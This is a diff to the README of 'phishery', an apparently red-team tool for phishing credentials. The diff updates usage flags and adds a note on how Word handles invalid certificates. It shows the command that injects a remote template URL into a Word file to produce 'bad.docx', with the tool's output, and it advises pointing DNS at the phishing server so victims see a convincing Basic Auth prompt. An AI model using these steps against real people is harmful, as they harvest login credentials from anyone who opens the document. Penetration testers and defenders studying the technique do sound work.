@@ -91,7 +91,7 @@ The effectiveness of this tool is based mostly on the Domain and Basic Auth Real
 will see when triggered from an Office document. Make sure to point your DNS A Records the public IP of the phishery server.
 
 It's recommended that the provided cert is replaced with a trusted one, such as one generated with 
-[LetsEncrypt](https://github.com/certbot/certbot). Microsoft Word on OS X will prevent the auth dialog if the cert is invalid.
+[LetsEncrypt](https://github.com/certbot/certbot). Microsoft Word on OS X will prevent the auth dialog if the cert is invalid, and Microsoft Word on Windows will prompt the user to accept the invalid certificate.
 
 Once the server is configured and running, all you need to do is embed a phishery URL in a document, or anywhere
 else your heart desires. phishery does give you the ability to inject your URL into a Word document as a template, 
@@ -103,7 +103,7 @@ To inject a Word document with a template URL, you'll need a .docx file and the 
 Now run phishery with your document and URL:
 
 ```text
-$ phishery -url https://secure.site.local/docs -docx good.docx -badocx bad.docx
+$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 [+] Opening Word document: good.docx
 [+] Setting Word document template to: https://secure.site.local/docs
 [+] Saving injected Word document to: bad.docx
